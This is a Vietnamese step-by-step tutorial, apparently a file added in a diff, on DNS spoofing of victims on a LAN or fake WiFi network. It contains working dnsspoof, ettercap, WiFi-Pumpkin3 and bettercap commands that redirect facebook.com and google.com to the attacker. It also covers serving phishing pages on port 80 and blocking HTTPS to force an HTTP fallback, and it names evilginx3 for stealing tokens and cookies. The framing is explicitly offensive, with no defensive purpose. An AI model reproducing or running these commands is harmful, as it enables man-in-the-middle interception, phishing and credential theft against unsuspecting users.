@@ -1,0 +1,83 @@
+🎯 MỤC TIÊU:
+
+    Giả mạo DNS để chuyển hướng nạn nhân truy cập vào facebook.com, google.com, v.v… đến máy của bạn.
+
+    Có thể kết hợp với WiFi giả mạo, phishing, hoặc MITM.
+
+🟢 PHẦN 1: CƠ BẢN – GIẢ MẠO DNS VỚI dnsspoof hoặc ettercap
+✅ Cách 1: Dùng dnsspoof
+
+    Tạo file spoof_hosts:
+
+echo "192.168.88.1 facebook.com" > spoof_hosts
+
+(192.168.88.1 là IP máy bạn)
+
+    Chạy dnsspoof:
+
+dnsspoof -i wlan0 -f spoof_hosts
+
+    ✅ Khi nạn nhân vào facebook.com, họ sẽ được trỏ về 192.168.88.1.
+
+✅ Cách 2: Dùng ettercap để spoof DNS toàn mạng
+
+ettercap -T -q -i wlan0 -P dns_spoof -M arp:remote
+
+Ettercap sẽ chặn mọi truy vấn DNS từ LAN và trả về địa chỉ IP giả bạn cấu hình trong /usr/share/ettercap/etter.dns.
+🟡 PHẦN 2: TRUNG CẤP – DNS SPOOF TRONG WiFi-Pumpkin3
+
+Nếu bạn đang dùng WiFi-Pumpkin3 để tạo Wi-Fi giả mạo:
+
+    Gõ:
+
+show plugins
+
+    Bật plugin:
+
+use misc.dns_spoof
+
+    Cấu hình domain cần spoof:
+
+set target facebook.com
+set redirect 10.0.0.1
+start
+
+    ✅ Mọi truy cập đến facebook.com sẽ bị chuyển hướng về IP của bạn (thường là 10.0.0.1).
+
+🔴 PHẦN 3: NÂNG CAO – TOÀN QUYỀN GIẢ MẠO DNS VÀ HTTP(S)
+✅ 1. Dùng bettercap (mạnh, hiện đại hơn ettercap)
+
+bettercap -iface wlan0
+
+Trong console:
+
+set dns.spoof.domains facebook.com,google.com
+set dns.spoof.address 10.0.0.1
+dns.spoof on
+
+    ⚡ Cực kỳ mạnh, có thể chặn theo wildcard domain (*.google.com, *.zalo.me, v.v.)
+
+✅ 2. Giả mạo DNS + HTTP server + Captive portal
+
+Sau khi spoof thành công, bạn cần có 1 HTTP server chạy trên cổng 80 để lừa nạn nhân.
+
+Ví dụ đơn giản:
+
+cd /root/phishing_pages/facebook/
+python3 -m http.server 80
+
+✅ 3. Chặn HTTPS (bypass phần nào)
+
+HTTPS rất khó spoof, nhưng bạn có thể dùng:
+
+    dns spoof + block port 443 → trình duyệt fallback về HTTP
+
+    Dẫn nạn nhân truy cập http://neverssl.com
+
+    SSLStrip (không còn hiệu quả nhiều)
+
+🧠 TÓM TẮT LẠI
+Mức	Công cụ	Mô tả
+Cơ bản	dnsspoof, ettercap	Spoof tên miền tĩnh
+Trung cấp	WiFi-Pumpkin3	DNS spoof kèm Wi-Fi giả
+Nâng cao	bettercap, evilginx3	Spoof + MITM + lấy token/cookie
